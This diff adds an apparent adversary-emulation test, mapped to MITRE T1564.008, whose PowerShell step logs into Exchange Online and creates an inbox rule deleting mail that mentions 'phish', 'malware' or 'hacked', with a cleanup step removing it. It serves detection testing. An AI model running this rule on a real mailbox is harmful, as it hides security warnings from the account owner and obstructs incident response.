@@ -1,0 +1,46 @@
+api_version: "2.0"
+name: New-Inbox Rule to Hide E-mail in M365
+description: |
+    This test simulates a user adding an inbox rule in M365 to delete emails with specific keywords in email subject or body.
+     Reference: https://www.mandiant.com/sites/default/files/2021-09/rpt-fin4.pdf
+args:
+    - name: auth_username
+      type: string
+      default: john@contoso.com
+    - name: auth_password
+      type: string
+      default: p4sswd
+    - name: mail_rulename
+      type: string
+      default: default
+    - name: target_mailbox
+      type: string
+      default: jane@contoso.com
+uuid: 30f7d3d1-78e2-4bf0-9efa-a175b5fce2a9
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1564: Hide Artifacts'
+    subtechniques:
+        - 'T1564.008: Email Hiding Rules'
+requirements:
+    platforms:
+        - os: azure-ad
+steps:
+    - name: new-inbox-rule-to-hide-e-mail-in-m365
+      inline: |
+        Import-Module ExchangeOnlineManagement
+        $password = ConvertTo-SecureString -String "{{.Args.auth_password}}" -AsPlainText -Force
+        $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.auth_username}}", $password
+        Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
+        New-InboxRule -Mailbox {{.Args.target_mailbox}} -Name {{.Args.mail_rulename}} -SubjectOrBodyContainsWords ("phish","malware","hacked") -Confirm:$false -DeleteMessage:$true
+      executor: powershell
+      cleanup:
+        inline: |
+            Import-Module ExchangeOnlineManagement
+            $password = ConvertTo-SecureString -String "{{.Args.auth_password}}" -AsPlainText -Force
+            $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "{{.Args.auth_username}}", $password
+            Connect-ExchangeOnline -Credential $credential
+            Remove-InboxRule -Mailbox {{.Args.target_mailbox}} -Identity {{.Args.mail_rulename}} -Confirm:$false
+        executor: powershell
